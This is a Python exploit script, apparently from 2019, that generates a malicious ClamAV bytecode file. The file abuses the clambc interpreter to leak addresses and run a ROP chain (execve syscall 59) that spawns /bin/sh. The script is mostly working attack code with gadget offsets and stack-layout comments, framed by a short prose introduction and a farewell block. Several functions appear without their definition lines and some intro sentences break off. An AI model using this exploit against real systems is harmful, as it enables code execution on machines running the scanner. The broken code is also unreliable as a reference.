 
&#039;&#039;&#039;
Finished  : 22/07/2019
Pu8lished : 31/10/2019
Versi0n   : Current    (<= 0.102.0)
Result    : Just for fun.
 
"Because of my inability to change the world."
 
In 2002, ClamAV got introducted as a solution for malwares on UNIX-based systems, built on
a signature-based detection approach, and still undergoes active-development. by that time,
 
ClamBC were exceptionally more complex and served as a testing tool for bytecodes, majorly
 
The availability of the source-code and the lack of documentation led to the establishment
of this paper, it was certainly not an attempt to escalate privileges, but rather a sought
-after experience, and source of entertainment that grants the thrill of a challenge.
 
Due to the considerable amount of time spent in the analysis, the dissection of the engine
was imminent, whilst significantly broadening our perception on its internal structures.
The trial and error process produced valuable information, crashes illuminated latent bugs,
effectively increasing the attack surface, and magnifying the possibility for exploitation.
 
> ./exploit.py
> clambc --debug exploit
[SNIP]
$
&#039;&#039;&#039;
 
names = [&#039;test1&#039;,
         &#039;read&#039;,
         &#039;write&#039;,
         &#039;seek&#039;,
         &#039;setvirusname&#039;,
         &#039;debug_print_str&#039;,
         &#039;debug_print_uint&#039;,
         &#039;disasm_x86&#039;,
         &#039;trace_directory&#039;,
         &#039;trace_scope&#039;,
         &#039;trace_source&#039;,
         &#039;trace_op&#039;,
         &#039;trace_value&#039;,
         &#039;trace_ptr&#039;,
         &#039;pe_rawaddr&#039;,
         &#039;file_find&#039;,
         &#039;file_byteat&#039;,
         &#039;malloc&#039;,
         &#039;test2&#039;,
         &#039;get_pe_section&#039;,
         &#039;fill_buffer&#039;,
         &#039;extract_new&#039;,
         &#039;read_number&#039;,
         &#039;hashset_new&#039;,
         &#039;hashset_add&#039;,
         &#039;hashset_remove&#039;,
         &#039;hashset_contains&#039;,
         &#039;hashset_done&#039;,
         &#039;hashset_empty&#039;,
         &#039;buffer_pipe_new&#039;,
         &#039;buffer_pipe_new_fromfile&#039;,
         &#039;buffer_pipe_read_avail&#039;,
         &#039;buffer_pipe_read_get&#039;,
         &#039;buffer_pipe_read_stopped&#039;,
         &#039;buffer_pipe_write_avail&#039;,
         &#039;buffer_pipe_write_get&#039;,
         &#039;buffer_pipe_write_stopped&#039;,
         &#039;buffer_pipe_done&#039;,
         &#039;inflate_init&#039;,
         &#039;inflate_process&#039;,
         &#039;inflate_done&#039;,
         &#039;bytecode_rt_error&#039;,
         &#039;jsnorm_init&#039;,
         &#039;jsnorm_process&#039;,
         &#039;jsnorm_done&#039;,
         &#039;ilog2&#039;,
         &#039;ipow&#039;,
         &#039;iexp&#039;,
         &#039;isin&#039;,
         &#039;icos&#039;,
         &#039;memstr&#039;,
         &#039;hex2ui&#039;,
         &#039;atoi&#039;,
         &#039;debug_print_str_start&#039;,
         &#039;debug_print_str_nonl&#039;,
         &#039;entropy_buffer&#039;,
         &#039;map_new&#039;,
         &#039;map_addkey&#039;,
         &#039;map_setvalue&#039;,
         &#039;map_remove&#039;,
         &#039;map_find&#039;,
         &#039;map_getvaluesize&#039;,
         &#039;map_getvalue&#039;,
         &#039;map_done&#039;,
         &#039;file_find_limit&#039;,
         &#039;engine_functionality_level&#039;,
         &#039;engine_dconf_level&#039;,
         &#039;engine_scan_options&#039;,
         &#039;engine_db_options&#039;,
         &#039;extract_set_container&#039;,
         &#039;input_switch&#039;,
         &#039;get_environment&#039;,
         &#039;disable_bytecode_if&#039;,
         &#039;disable_jit_if&#039;,
         &#039;version_compare&#039;,
         &#039;check_platform&#039;,
         &#039;pdf_get_obj_num&#039;,
         &#039;pdf_get_flags&#039;,
         &#039;pdf_set_flags&#039;,
         &#039;pdf_lookupobj&#039;,
         &#039;pdf_getobjsize&#039;,
         &#039;pdf_getobj&#039;,
         &#039;pdf_getobjid&#039;,
         &#039;pdf_getobjflags&#039;,
         &#039;pdf_setobjflags&#039;,
         &#039;pdf_get_offset&#039;,
         &#039;pdf_get_phase&#039;,
         &#039;pdf_get_dumpedobjid&#039;,
         &#039;matchicon&#039;,
         &#039;running_on_jit&#039;,
         &#039;get_file_reliability&#039;,
         &#039;json_is_active&#039;,
         &#039;json_get_object&#039;,
         &#039;json_get_type&#039;,
         &#039;json_get_array_length&#039;,
         &#039;json_get_array_idx&#039;,
         &#039;json_get_string_length&#039;,
         &#039;json_get_string&#039;,
         &#039;json_get_boolean&#039;,
         &#039;json_get_int&#039;]
o     = names.index(&#039;buffer_pipe_new&#039;) + 1
k     = names.index(&#039;buffer_pipe_write_get&#039;) + 1
l     = names.index(&#039;debug_print_str&#039;) + 1
m     = names.index(&#039;malloc&#039;) + 1
 
c     = 0
for name in names:
    names[c] = name.encode(&#039;hex&#039;)
    c += 1
 
def cc(n):
    v = chr(n + 0x60)
   
    return v
 
def cs(s):
    t = &#039;&#039;
       
    for i in xrange(0, len(s), 2):
        u  = int(s[i], 16)
        l  = int(s[i + 1], 16)
        for i in  [u, l]:
            if((i >= 0 and i <= 0xf)):
                continue
            print &#039;Invalid string.&#039;
            exit(0)
       
        t += cc(l) + cc(u)
   
    return t
   
def wn(n, fixed=0, size=0):
    if n is 0:
        return cc(0)
 
    t  = &#039;&#039;
    c  = hex(n)[2:]
    l  = len(c)
    if (l % 2) is 1:
        c = "0" + c
    r  = c[::-1]
   
    if(l <= 0x10):
        if not fixed:
            t = cc(l)
        i = 0
        while i < l:
            t += cc(int(r[i], 16))
            i += 1
    else:
        print &#039;Invalid number.&#039;
        exit(0)
   
    if size != 0:
        t = t.ljust(size, &#039;`&#039;)
       
    return t
 
def ws(s):
    t  = &#039;|&#039;
    e = s[-2:]
    if(e != &#039;00&#039;):
        print &#039;[+] Adding null-byte at the end of the string..&#039;
        s += &#039;00&#039;
   
    l  = (len(s) / 2)
   
    if (len(s) % 2) is 1:
        print &#039;Invalid string length.&#039;
        exit(0)
   
    t += wn(l)
    t += cs(s)
   
    return t
   
def wt(t):
    if t < (num_types + 0x45):
        v = wn(t)
        return v
    else:
        print &#039;Invalid type.&#039;
        exit(0)
 
def initialize_header(minfunc=0, maxfunc=0, num_func=0, linelength=4096):
    global flimit, num_types
   
    if maxfunc is 0:
        maxfunc = flimit
   
    if(minfunc > flimit or  maxfunc < flimit):
        print &#039;Invalid minfunc and/or maxfunc.&#039;
        exit(0)
   
    header   = "ClamBC"
    header  += wn(0x07)                 # formatlevel(6, 7)
    header  += wn(0x88888888)           # timestamp
    header  += ws("416c69656e")         # sigmaker
    header  += wn(0x00)                 # targetExclude
    header  += wn(0x00)                 # kind
    header  += wn(minfunc)              # minfunc
    header  += wn(maxfunc)              # maxfunc
    header  += wn(0x00)                 # maxresource
    header  += ws("00")                 # compiler
    header  += wn(num_types + 5)        # num_types
    header  += wn(num_func)             # num_func
    header  += wn(0x53e5493e9f3d1c30)   # magic1
    header  += wn(0x2a, 1)              # magic2
    header  += &#039;:&#039;
    header  += str(linelength)
    header  += chr(0x0a)*2
    return header
 
    global num_types
   
    types    = "T"
    types   += wn(0x45, 1)               # start_tid(69)
   
    for i in range(0, num_types):
        types   += wn(type[i], 1)            # kind
        if type[i] in [1, 2, 3]:
        # Function, PackedStruct, Struct
            types += wn(nume[i])             # numElements
            for j in range(0, nume[i]):
                types += wt(contained[i][j]) # containedTypes[j]
        else:
        # Array, Pointer
            if type[i] != 5:
                types += wn(nume[i])         # numElements
            types += wt(contained[i][0])     # containedTypes[0]
       
    types   += chr(0x0a)
    return types
   
    global maxapi, names, ids, tids
 
    if(calls > max_api):
        print &#039;Invalid number of calls.&#039;
        exit(0)
   
    apis     = &#039;E&#039;
    apis    += wn(max_api)               # maxapi
    apis    += wn(calls)                 # calls(<= maxapi)
   
    for i in range(0, calls):
        apis += wn(ids[i])               # id
        apis += wn(tids[i])              # tid
        apis += ws(names[ids[i] - 1])    # name
   
    apis    += chr(0x0a)
    return apis
   
    global max_globals, type, gval
   
    globals  = &#039;G&#039;
    globals += wn(max_globals)           # maxglobals
    globals += wn(numglobals)            # numglobals
   
    for i in range(0, numglobals):
        globals += wt(type[i])           # type
        for j in gval[i]:                # subcomponents
            n        = wn(j)
            globals += chr(ord(n[0]) - 0x20)
            globals += n[1:]
       
    globals += cc(0)
    globals += chr(0x0a)
    return globals
 
    global allo
   
    if numa > 0xf:
        print &#039;Invalid number of arguments.&#039;
        exit(0)
 
    fheader  = &#039;A&#039;
    fheader += wn(numa, 1)               # numArgs
    fheader += wt(0x20)                  # returnType
    fheader += &#039;L&#039;
    fheader += wn(numl)                  # numLocals
   
    for i in range(0, numa + numl):
        fheader += wn(type[i])           # types
        fheader += wn(allo[i], 1)        # | 0x8000
       
    fheader += &#039;F&#039;
    fheader += wn(numi)                  # numInsts
    fheader += wn(numbb)                 # numBB
    fheader += chr(0x0a)
    return fheader
   
 
   
flimit      = 93
max_api     = 100
max_globals = 32773
 
num_types   = 6
 
 
# Header parsing
w    = initialize_header(num_func=0x1)
# Types parsing
cont = [[0x8], [0x45], [0x20, 0x20], [0x41, 0x20, 0x20], [0x20, 0x41, 0x20], [0x41, 0x20]]
type = [0x4, 0x5, 0x1, 0x1, 0x1, 0x1]
num  = [0x8, 0x1, 0x2, 0x3, 0x3, 0x2]
# API parsing
ids  = [o, k, l, m]
tids = [71, 72, 73, 74]
&#039;&#039;&#039;
# crash @ id=0
&#039;&#039;&#039;
# Globals parsing
type = [0x45]
gval = [[0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41]]
# Function header parsing
type = [0x45, 0x41, 0x40, 0x40, 0x40, 0x40, 0x20]
allo = [   1,    0,    0,    0,    0,    0,    0]
# BB parsing
p  = &#039;B&#039;
 
# GEPZ Var #1 = ((Var #0(Stack) Pointer) + 0x0)
p += wn(0x0)
p += wn(0x1)
p += wn(0x24, 1)
p += wn(0x46)
p += wn(0x0)
p += &#039;@d&#039;
 
# STORE (0x0068732f6e69622f(L=8) -> ([Var #1]))
p += wn(0x40)
p += wn(0x0)
p += wn(0x26, 1)
p += &#039;Nobbfifnfobcghfh&#039;
p += wn(0x1)
 
# GEPZ Var #1 = ((Var #0(Stack) Pointer) + 0x360)
p += wn(0x0)
p += wn(0x1)
p += wn(0x24, 1)
p += wn(0x46)
p += wn(0x0)
p += &#039;C`fcd&#039;
 
# LOAD Var #2 = ([Var #1])
p += wn(0x40)
p += wn(0x2)
p += wn(0x27, 1)
p += wn(0x1)
 
# SUB Var #2 -= 0xd260
p += wn(0x40)
p += wn(0x2)
p += wn(0x2, 1, 2)
p += wn(0x2)
p += &#039;D`fbmd&#039;
 
# GEPZ Var #1 = ((Var #0(Stack) Pointer) + 0x10)
p += wn(0x0)
p += wn(0x1)
p += wn(0x24, 1)
p += wn(0x46)
p += wn(0x0)
p += &#039;B`ad&#039;
 
# LOAD Var #3 = ([Var #1])
p += wn(0x40)
p += wn(0x3)
p += wn(0x27, 1)
p += wn(0x1)
 
# SUB Var #3 -= 0x10
p += wn(0x40)
p += wn(0x3)
p += wn(0x2, 1, 2)
p += wn(0x3)
p += &#039;B`ad&#039;
 
# GEPZ Var #1 = ((Var #0(Stack) Pointer) + 0x30)
p += wn(0x0)
p += wn(0x1)
p += wn(0x24, 1)
p += wn(0x46)
p += wn(0x0)
p += &#039;B`cd&#039;
 
# LOAD Var #4 = ([Var #1])
p += wn(0x40)
p += wn(0x4)
p += wn(0x27, 1)
p += wn(0x1)
 
# SUB Var #4 -= 0x190
p += wn(0x40)
p += wn(0x4)
p += wn(0x2, 1, 2)
p += wn(0x4)
p += &#039;C`iad&#039;
 
 
# GEPZ Var #1 = ((Var #0(Stack) Pointer) + 0x38)
p += wn(0x0)
p += wn(0x1)
p += wn(0x24, 1)
p += wn(0x46)
p += wn(0x0)
p += &#039;Bhcd&#039;
 
# STORE (Var #3 -> Var #1)
p += wn(0x40)
p += wn(0x0)
p += wn(0x26, 1)
p += wn(0x3)
p += wn(0x1)
 
# GEPZ Var #1 = ((Var #0(Stack) Pointer) + 0x48)
p += wn(0x0)
p += wn(0x1)
p += wn(0x24, 1)
p += wn(0x46)
p += wn(0x0)
p += &#039;Bhdd&#039;
 
# ADD Var #3 += 0x3
p += wn(0x40)
p += wn(0x3)
p += wn(0x2, 1, 2)
p += wn(0x3)
p += &#039;Acd&#039;
 
# STORE (Var #3 -> Var #1)
p += wn(0x40)
p += wn(0x0)
p += wn(0x26, 1)
p += wn(0x3)
p += wn(0x1)
 
# GEPZ Var #1 = ((Var #0(Stack) Pointer) + 0x28)
p += wn(0x0)
p += wn(0x1)
p += wn(0x24, 1)
p += wn(0x46)
p += wn(0x0)
p += &#039;Bhbd&#039;
 
# ADD Var #5 += Var #2 + 0xcbda
p += wn(0x40)
p += wn(0x5)
p += wn(0x1, 1, 2)
p += wn(0x2)
p += &#039;Djmkld&#039;
 
# STORE (Var #5 -> Var #1)
p += wn(0x40)
p += wn(0x0)
p += wn(0x26, 1)
p += wn(0x5)
p += wn(0x1)
 
# GEPZ Var #1 = ((Var #0(Stack) Pointer) + 0x20)
p += wn(0x0)
p += wn(0x1)
p += wn(0x24, 1)
p += wn(0x46)
p += wn(0x0)
p += &#039;B`bd&#039;
 
# STORE (Var #4 -> Var #1)
p += wn(0x40)
p += wn(0x0)
p += wn(0x26, 1)
p += wn(0x4)
p += wn(0x1)
 
# GEPZ Var #1 = ((Var #0(Stack) Pointer) + 0x18)
p += wn(0x0)
p += wn(0x1)
p += wn(0x24, 1)
p += wn(0x46)
p += wn(0x0)
p += &#039;Bhad&#039;
 
# ADD Var #5 += Var #2 + 0x99dc
p += wn(0x40)
p += wn(0x5)
p += wn(0x1, 1, 2)
p += wn(0x2)
p += &#039;Dlmiid&#039;
 
# STORE (Var #5 -> Var #1)
p += wn(0x40)
p += wn(0x0)
p += wn(0x26, 1)
p += wn(0x5)
p += wn(0x1)
 
# GEPZ Var #1 = ((Var #0(Stack) Pointer) + 0x10)
p += wn(0x0)
p += wn(0x1)
p += wn(0x24, 1)
p += wn(0x46)
p += wn(0x0)
p += &#039;B`ad&#039;
 
# STORE (0x3b -> Var #1)
p += wn(0x40)
p += wn(0x0)
p += wn(0x26, 1)
p += &#039;Bkcd&#039;
p += wn(0x1)
 
# GEPZ Var #1 = ((Var #0(Stack) Pointer) + 0x30)
p += wn(0x0)
p += wn(0x1)
p += wn(0x24, 1)
p += wn(0x46)
p += wn(0x0)
p += &#039;B`cd&#039;
 
# STORE (0x0 -> Var #1)
p += wn(0x40)
p += wn(0x0)
p += wn(0x26, 1)
p += &#039;@d&#039;
p += wn(0x1)
 
# GEPZ Var #1 = ((Var #0(Stack) Pointer) + 0x40)
p += wn(0x0)
p += wn(0x1)
p += wn(0x24, 1)
p += wn(0x46)
p += wn(0x0)
p += &#039;B`dd&#039;
 
# STORE (0x0 -> Var #1)
p += wn(0x40)
p += wn(0x0)
p += wn(0x26, 1)
p += &#039;@d&#039;
p += wn(0x1)
 
# GEPZ Var #1 = ((Var #0(Stack) Pointer) + 0x8)
p += wn(0x0)
p += wn(0x1)
p += wn(0x24, 1)
p += wn(0x46)
p += wn(0x0)
p += &#039;Ahd&#039;
 
# ADD Var #2 += 0x6d68
p += wn(0x40)
p += wn(0x2)
p += wn(0x1, 1, 2)
p += wn(0x2)
p += &#039;Dhfmfd&#039;
 
# STORE (Var #2 -> Var #1)
p += wn(0x40)
p += wn(0x0)
p += wn(0x26, 1)
p += wn(0x2)
p += wn(0x1)
 
&#039;&#039;&#039;
0x99dc : pop rdi ; ret
0xcbda : pop rsi ; ret
0x6d68 : pop rax ; ret
 
Var #2 = text_base
Var #3 = syscall       (+3: pop rdx; ret)
Var #4 = "/bin/sh\x00"
 
pop rax; ret; o  0x8
59            o  0x10
pop rdi; ret; o  0x18
sh; address   o  0x20
pop rsi; ret; o  0x28
0x0           o  0x30
pop rdx; ret; o  0x38
0x0           o  0x40
syscall       o  0x48
&#039;&#039;&#039;
 
# COPY Var #6 = (0x5a90050f(o`e``ije))
p += wn(0x20)
p += wn(0x0)
p += wn(0x22, 1)
p += &#039;Ho`e``ijeh&#039;
p += wn(0x6)
 
p += &#039;T&#039;
p += wn(0x13, 1)
p += wn(0x20)
p += wn(0x6)
p += &#039;E&#039;
 
w += p
f  = open("exploit", "w")
f.write(w)
f.close()
 
print &#039;[+] Generated payload&#039;
 
&#039;&#039;&#039;
pursuit to climb the ladder of social-status, greed is engraved in their nature,
they&#039;re materialistic, and the essence of their lives is money and wealth.
However, such definition is inaccurate as it doesn&#039;t apply to the minority.
I have discovered a truly marvelous proof of their existence, which this margin
is too narrow to contain.
 
- Alien599, not Fermat.
 
Greetings to Alien133, Alien610, Alien6068, Alien814, Alien641.
X
&#039;&#039;&#039;

